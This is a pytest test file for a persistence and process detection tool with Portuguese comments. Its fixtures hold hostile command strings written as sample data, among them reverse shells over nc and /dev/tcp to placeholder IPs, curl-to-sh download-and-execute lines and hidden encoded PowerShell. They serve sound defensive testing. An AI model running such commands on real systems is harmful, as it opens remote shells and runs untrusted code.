"""Profundidade de detecção: executáveis referenciados, mais locais de persistência, processos e scripts."""
import os
from types import SimpleNamespace

import pytest

from vigil import core, persist, trust


@pytest.fixture(autouse=True)
def sem_pastas_suspeitas_do_tmp(monkeypatch):
    # o tmp_path do pytest fica em \temp\ ou /tmp/ e somaria pontos de "diretório suspeito" nos testes de arquivo
    monkeypatch.setitem(core.SUSPECT_DIRS, "windows", ("\\users\\public\\",))
    monkeypatch.setitem(core.SUSPECT_DIRS, "linux", ("/dev/shm/",))


def pe_entropico(tmp_path, nome="x.bin"):
    p = tmp_path / nome
    p.write_bytes(b"MZ" + os.urandom(8192))
    return p


# ------------------------------------------------------------ extração de executáveis
@pytest.mark.skipif(os.name != "nt", reason="expandvars de %VAR% só no Windows")
def test_extract_windows():
    ex = persist.extract_exes
    assert ex(r'"C:\Program Files\App\a.exe" /silent', "windows") == [r"C:\Program Files\App\a.exe"]
    assert ex(r"C:\Program Files\App\a.exe /silent", "windows") == [r"C:\Program Files\App\a.exe"]
    assert ex(r"rundll32.exe C:\Users\Public\x.dll,Entry", "windows") == [r"C:\Users\Public\x.dll"]
    assert ex(r'cmd.exe /c "C:\a b\run.bat" && C:\z.ps1', "windows") == [r"C:\a b\run.bat", r"C:\z.ps1"]
    assert ex("cmd.exe /c echo oi", "windows") == []
    root = os.environ["SystemRoot"]
    assert ex(r"%SystemRoot%\system32\calc.exe", "windows") == [root + r"\system32\calc.exe"]


def test_extract_linux():
    ex = persist.extract_exes
    assert ex("ExecStart=-/usr/bin/x --conf=/etc/x.conf", "linux") == ["/usr/bin/x", "/etc/x.conf"]
    assert ex("* * * * * root /opt/a/run.sh >/dev/null 2>&1", "linux") == ["/opt/a/run.sh"]
    assert ex("curl http://exemplo.com/a.sh | sh", "linux") == []  # URL não é caminho
    assert ex("cat /proc/cpuinfo /dev/null /sys/x", "linux") == []


# ------------------------------------------------------------ entrada de persistência -> binário
def test_entry_segue_o_binario_referenciado(tmp_path, monkeypatch):
    b = pe_entropico(tmp_path)
    monkeypatch.setattr(persist, "extract_exes", lambda cmd, os_name: [str(b)])
    f = persist.entry("Run\\Algo", "comando-sem-nada-suspeito", core.Ctx("windows"), ("T1547.001",))
    assert f and f["target"]["path"] == str(b) and f["target"]["sha256"] == core.sha256_file(b)
    assert any("Binário referenciado" in r and "Entropia alta" in r for r in f["reasons"])
    assert {t["id"] for t in f["attack"]} == {"T1547.001", "T1027.002"}


def test_entry_sem_nada_suspeito_nao_gera_achado(tmp_path, monkeypatch):
    limpo = tmp_path / "ok.txt"
    limpo.write_text("oi")
    monkeypatch.setattr(persist, "extract_exes", lambda cmd, os_name: [str(limpo)])
    assert persist.entry("Run\\Algo", "comando", core.Ctx("windows"), ("T1547.001",)) is None


def test_entry_usa_hash_e_yara_da_varredura(tmp_path, monkeypatch):
    b = tmp_path / "x.dat"
    b.write_bytes(b"amostra conhecida")
    monkeypatch.setattr(persist, "extract_exes", lambda cmd, os_name: [str(b)])
    ctx = core.Ctx("windows", {core.sha256_file(b)})
    assert persist.entry("Run\\Algo", "cmd", ctx, ())["score"] == 100


def test_ctx_analisa_cada_binario_uma_vez(tmp_path, monkeypatch):
    chamadas = []
    monkeypatch.setattr(core, "analyze_file", lambda *a, **k: chamadas.append(a[0]) or None)
    ctx = core.Ctx("linux")
    f = tmp_path / "a"
    f.write_bytes(b"1")
    ctx.analyze(f)
    ctx.analyze(str(f))
    assert len(chamadas) == 1


def test_ctx_ignora_arquivo_gigante(tmp_path, monkeypatch):
    f = tmp_path / "a"
    f.write_bytes(b"1")
    monkeypatch.setattr(core, "MAX_SIZE", 0)
    monkeypatch.setattr(core, "analyze_file", lambda *a, **k: pytest.fail("não deveria analisar"))
    assert core.Ctx("linux").analyze(f) is None


# ------------------------------------------------------------ abatimento por confiança (só motivos de pasta)
def _ctx_confiavel(monkeypatch, confiavel):
    monkeypatch.setattr(trust, "check", lambda p, o: {"trusted": confiavel, "label": "x"})
    return core.Ctx("windows", check_trust=True)


def test_binario_assinado_em_pasta_suspeita_nao_gera_achado(tmp_path, monkeypatch):
    app = tmp_path / "app.exe"
    app.write_bytes(b"MZ" + b"\0" * 10)
    cmd = f'"{app}"'
    monkeypatch.setattr(persist, "extract_exes", lambda c, o: [str(app)])
    r = persist.entry("Run\\App", cmd + " C:\\Users\\Public\\", _ctx_confiavel(monkeypatch, True), (), "Executa de diretório suspeito")
    assert r is None


def test_binario_nao_assinado_em_pasta_suspeita_continua(tmp_path, monkeypatch):
    app = tmp_path / "app.exe"
    app.write_bytes(b"MZ" + b"\0" * 10)
    monkeypatch.setattr(persist, "extract_exes", lambda c, o: [str(app)])
    r = persist.entry("Run\\App", "C:\\Users\\Public\\app.exe", _ctx_confiavel(monkeypatch, False), (), "Executa de diretório suspeito")
    assert r and "Executa de diretório suspeito" in r["reasons"]


def test_comando_malicioso_nao_e_abrandado_por_binario_assinado(tmp_path, monkeypatch):
    ps = tmp_path / "powershell.exe"
    ps.write_bytes(b"MZ")
    monkeypatch.setattr(persist, "extract_exes", lambda c, o: [str(ps)])
    r = persist.entry("Run\\X", "powershell.exe -w hidden -enc AAAA C:\\Users\\Public\\x", _ctx_confiavel(monkeypatch, True),
                      (), "Executa de diretório suspeito")
    assert r and "PowerShell codificado/oculto" in r["reasons"] and "Executa de diretório suspeito" not in r["reasons"]


def test_sem_check_trust_nao_consulta(monkeypatch):
    monkeypatch.setattr(trust, "check", lambda *a: pytest.fail("não deveria consultar"))
    r = [("x de diretório suspeito", 25)]
    assert persist.abate_dir_reasons(r, "C:\\a.exe", core.Ctx("windows")) == r


# ------------------------------------------------------------ authorized_keys
KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexemplo usuario@host"


def test_authorized_keys_comando_forcado_suspeito(tmp_path):
    p = tmp_path / "authorized_keys"
    p.write_text("# comentário\n" + KEY + "\n"
                 + 'command="curl http://x/a | sh",no-pty ' + KEY + "\n"
                 + 'command="/usr/bin/rsync --server",restrict ' + KEY + "\n")
    f = persist.scan_authorized_keys(p, core.Ctx("linux"))
    assert [x["where"].rsplit(":", 1)[1] for x in f] == ["3", "4"]  # a chave sem opções e o comentário ficam de fora
    assert f[0]["score"] > f[1]["score"] and any("Download executado direto" in r for r in f[0]["reasons"])
    assert f[1]["score"] == 30 and {t["id"] for t in f[1]["attack"]} == {"T1098.004"}
    assert all("AAAAC3Nza" not in x["detail"] for x in f)  # nunca o conteúdo da chave


def test_authorized_keys_sem_opcoes_nao_gera_achado(tmp_path):
    p = tmp_path / "authorized_keys"
    p.write_text(KEY + "\n" + 'from="10.0.0.1",no-pty ' + KEY + "\n")
    assert persist.scan_authorized_keys(p, core.Ctx("linux")) == []


# ------------------------------------------------------------ persistência de Linux em um HOME falso
def test_linux_persistence_novos_locais(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".ssh").mkdir(parents=True)
    (home / ".config" / "systemd" / "user" / "x.service.d").mkdir(parents=True)
    (home / ".config" / "systemd" / "user" / "job.service").write_text("[Service]\nExecStart=/bin/sh -c 'curl http://x/a | sh'\n")
    (home / ".config" / "systemd" / "user" / "job.timer").write_text("[Timer]\nOnCalendar=daily\n")
    (home / ".config" / "systemd" / "user" / "x.service.d" / "o.conf").write_text("[Service]\nExecStartPre=nc 1.2.3.4 9 -e /bin/sh\n")
    (home / ".ssh" / "authorized_keys").write_text('command="bash -i >& /dev/tcp/1.2.3.4/9" ' + KEY + "\n")
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.setattr(persist, "_homes", lambda: [home])
    f = persist.linux_persistence(core.Ctx("linux"))
    por = {x["where"].replace("\\", "/").split("/")[-1].split(":")[0]: x for x in f}
    assert {t["id"] for t in por["job.service"]["attack"]} >= {"T1543.002", "T1053.006"}  # serviço + timer
    assert "T1543.002" in {t["id"] for t in por["o.conf"]["attack"]}
    assert "T1098.004" in {t["id"] for t in por["authorized_keys"]["attack"]}
    assert all(x["when"] for x in f)


# ------------------------------------------------------------ processos
def test_nomes_parecidos():
    assert persist._edit1("svchost", "svch0st") and persist._edit1("svchost", "svchst")
    assert persist._edit1("svchost", "scvhost")  # troca de letras vizinhas
    assert not persist._edit1("svchost", "svchost") and not persist._edit1("svchost", "svchoost2")
    assert not persist._edit1("explorer", "firefox")


@pytest.mark.parametrize("nome,exe,esperado", [
    ("svchost.exe", r"C:\Users\x\AppData\svchost.exe", True),
    ("svchost.exe", r"C:\Windows\System32\svchost.exe", False),
    ("svchost.exe", "", False),  # sem permissão para ler o caminho: não acusa
    ("scvhost.exe", r"C:\Users\x\scvhost.exe", True),
    ("explorer.exe", r"C:\Windows\explorer.exe", False),
    ("explorer.exe", r"C:\Windows\System32\explorer.exe", True),
    ("chrome.exe", r"C:\Program Files\Google\chrome.exe", False),
])
def test_masquerade(nome, exe, esperado, monkeypatch):
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    r = persist.masquerade_reasons(nome, exe)
    assert bool(r) is esperado and all(x[2] == ("T1036.005",) for x in r)


@pytest.mark.parametrize("so,pai,filho,esperado", [
    ("windows", "WINWORD.EXE", "powershell.exe", True),
    ("windows", "outlook.exe", "cmd.exe", True),
    ("windows", "w3wp.exe", "cmd.exe", True),
    ("windows", "explorer.exe", "cmd.exe", False),
    ("windows", "WINWORD.EXE", "splwow64.exe", False),
    ("linux", "nginx", "bash", True),
    ("linux", "php-fpm8.2", "sh", True),
    ("linux", "sshd", "bash", False),
    ("linux", "nginx", "nginx", False),
])
def test_pai_filho(so, pai, filho, esperado):
    assert bool(persist.parent_child_reasons(so, pai, filho)) is esperado


class _FakeProc:
    def __init__(self, pid, ppid, name, exe="", cmd=()):
        self.info = {"pid": pid, "ppid": ppid, "name": name, "exe": exe, "cmdline": list(cmd), "create_time": 1_700_000_000.0}

    def net_connections(self, kind="inet"):
        return []


def _psutil(monkeypatch, procs):
    err = type("E", (Exception,), {})
    monkeypatch.setattr(core, "psutil", SimpleNamespace(process_iter=lambda attrs: procs, NoSuchProcess=err,
                                                         AccessDenied=err, ZombieProcess=err))


def test_scan_processes_detecta_pai_filho_e_masquerade(monkeypatch):
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    _psutil(monkeypatch, [
        _FakeProc(1, 0, "WINWORD.EXE"), _FakeProc(2, 1, "powershell.exe"),
        _FakeProc(3, 0, "svchost.exe", r"C:\Users\x\svchost.exe"),
        _FakeProc(4, 0, "svchost.exe", r"C:\Windows\System32\svchost.exe"),
        _FakeProc(5, 0, "notepad.exe", r"C:\Windows\System32\notepad.exe"),
    ])
    f = {x["where"]: x for x in persist.scan_processes("windows", core.Ctx("windows"))}
    assert set(f) == {"PID 2 powershell.exe", "PID 3 svchost.exe"}
    assert "T1204.002" in {t["id"] for t in f["PID 2 powershell.exe"]["attack"]}
    assert "T1036.005" in {t["id"] for t in f["PID 3 svchost.exe"]["attack"]}
    assert f["PID 2 powershell.exe"]["when"].startswith("2023-11-1")


def test_scan_processes_analisa_o_executavel(tmp_path, monkeypatch):
    b = pe_entropico(tmp_path, "implante.exe")
    _psutil(monkeypatch, [_FakeProc(7, 0, "implante.exe", str(b))])
    [f] = persist.scan_processes("windows", core.Ctx("windows"))
    assert any("Executável do processo" in r and "Entropia alta" in r for r in f["reasons"])
    assert "T1027.002" in {t["id"] for t in f["attack"]}


def test_scan_processes_servidor_web_gerando_shell(monkeypatch):
    _psutil(monkeypatch, [_FakeProc(1, 0, "nginx"), _FakeProc(2, 1, "sh", "/bin/sh", ["sh", "-c", "id"])])
    [f] = persist.scan_processes("linux", core.Ctx("linux"))
    assert "T1505.003" in {t["id"] for t in f["attack"]}


# ------------------------------------------------------------ persistência de Windows com o registro simulado
@pytest.mark.skipif(os.name != "nt", reason="winreg só no Windows")
def test_windows_persistence_novos_locais(monkeypatch):
    import winreg
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    run = r"Software\Microsoft\Windows\CurrentVersion\Run"
    values = {
        (winreg.HKEY_CURRENT_USER, run): [("Evil", "powershell -w hidden -enc AAAA")],
        (winreg.HKEY_LOCAL_MACHINE, persist._WINLOGON): [("Shell", "explorer.exe, evil.exe"),
                                                         ("Userinit", r"C:\Windows\system32\userinit.exe,C:\evil.exe")],
        (winreg.HKEY_LOCAL_MACHINE, persist._IFEO + "\\notepad.exe"): [("Debugger", r"C:\Users\Public\dbg.exe")],
        (winreg.HKEY_LOCAL_MACHINE, persist._WINDOWS_NT): [("AppInit_DLLs", r"C:\Users\Public\x.dll")],
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Evil"): [("Start", 2), ("ImagePath", r"C:\Users\Public\svc.exe")],
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Manual"): [("Start", 3), ("ImagePath", r"C:\Users\Public\m.exe")],
    }
    subkeys = {(winreg.HKEY_LOCAL_MACHINE, persist._IFEO): ["notepad.exe", "outro.exe"],
               (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"): ["Evil", "Manual"]}
    monkeypatch.setattr(persist, "_reg_values", lambda w, h, s: values.get((h, s), []))
    monkeypatch.setattr(persist, "_reg_subkeys", lambda w, h, s: subkeys.get((h, s), []))
    monkeypatch.setattr(persist.subprocess, "run", lambda *a, **k: SimpleNamespace(returncode=1, stdout="", stderr=""))
    notes = []
    f = persist.windows_persistence(core.Ctx("windows"), notes)
    por = {x["where"].split("\\")[-1] if "Services" not in x["where"] else x["where"]: x for x in f}

    def ids(k):
        return {t["id"] for t in por[k]["attack"]}

    assert "T1547.001" in ids("Evil") and "T1059.001" in ids("Evil")
    assert ids("Shell") == {"T1547.004"} and ids("Userinit") == {"T1547.004"}
    assert ids("Debugger") == {"T1546.012"} and "T1546.010" in ids("AppInit_DLLs")
    assert "T1543.003" in ids("Serviço Evil") and "Serviço Manual" not in por  # serviço manual não persiste
    assert any("WMI" in n for n in notes)  # a consulta WMI falhou: vira aviso, não exceção


@pytest.mark.skipif(os.name != "nt", reason="winreg só no Windows")
def test_winlogon_padrao_nao_gera_achado(monkeypatch, tmp_path):
    import winreg
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    monkeypatch.setenv("APPDATA", str(tmp_path / "a"))        # isola as pastas Startup reais da máquina
    monkeypatch.setenv("PROGRAMDATA", str(tmp_path / "p"))
    values = {(winreg.HKEY_LOCAL_MACHINE, persist._WINLOGON): [("Shell", "explorer.exe"),
                                                               ("Userinit", r"C:\Windows\system32\userinit.exe,")]}
    monkeypatch.setattr(persist, "_reg_values", lambda w, h, s: values.get((h, s), []))
    monkeypatch.setattr(persist, "_reg_subkeys", lambda w, h, s: [])
    monkeypatch.setattr(persist.subprocess, "run", lambda *a, **k: SimpleNamespace(returncode=1, stdout="", stderr=""))
    assert persist.windows_persistence(core.Ctx("windows"), []) == []


def test_service_image():
    assert persist._service_image(r"\SystemRoot\System32\drivers\x.sys").lower().endswith(r"\system32\drivers\x.sys")
    assert persist._service_image(r"\??\C:\Windows\x.sys") == r"C:\Windows\x.sys"
    assert persist._service_image(r"System32\drivers\x.sys").lower().endswith(r"\system32\drivers\x.sys")
    assert persist._service_image(r'"C:\a b\s.exe" -k x') == r'"C:\a b\s.exe" -k x'


@pytest.mark.skipif(os.name != "nt", reason="Windows real, somente leitura")
def test_windows_real_nao_quebra_e_nao_gera_ruido_absurdo():
    f = persist.windows_persistence(core.Ctx("windows"), [])
    assert isinstance(f, list) and all(x["type"] == "persistence" and x["reasons"] for x in f)


# ------------------------------------------------------------ scripts e alvos avulsos (núcleo)
def test_script_com_comando_suspeito(tmp_path):
    p = tmp_path / "a.ps1"
    p.write_text("Write-Host oi\npowershell -w hidden -enc AAAA\n")
    r = core.analyze_file(p, "windows", set(), None)
    assert any(x.startswith("Script contém: PowerShell codificado") for x in r["reasons"])
    assert {t["id"] for t in r["attack"]} == {"T1059.001", "T1027.010"} and r["when"]


def test_script_em_utf16_com_bom(tmp_path):
    p = tmp_path / "a.ps1"
    p.write_bytes("powershell -w hidden -enc AAAA".encode("utf-16"))
    assert core.analyze_file(p, "windows", set(), None)


@pytest.mark.parametrize("nome,texto", [("a.ps1", "Get-ChildItem\n"), ("a.sh", "echo ola /tmp/x\n"),
                                        ("a.txt", "powershell -w hidden -enc AAAA")])
def test_script_limpo_ou_extensao_comum_nao_gera_achado(tmp_path, nome, texto):
    p = tmp_path / nome
    p.write_text(texto)
    assert core.analyze_file(p, "windows", set(), None) is None  # 'caminho temporário' sozinho é ruído; .txt não é script


def test_alvo_pode_ser_um_arquivo_avulso(tmp_path):
    ruim = tmp_path / "fatura.pdf.exe"
    ruim.write_text("x")
    (tmp_path / "outro.pdf.exe").write_text("x")
    f, total = core.scan_files([str(ruim)], "windows", set(), None)
    assert total == 1 and [x["where"] for x in f] == [str(ruim)]


def test_finding_com_abatimento_nao_fica_negativo():
    assert core.finding("file", "x", [("a", 10), ("b", -30)])["score"] == 0


def test_achado_de_arquivo_tem_data(tmp_path):
    p = tmp_path / "a.pdf.exe"
    p.write_text("x")
    assert core.analyze_file(p, "windows", set(), None)["when"][:2] == "20"
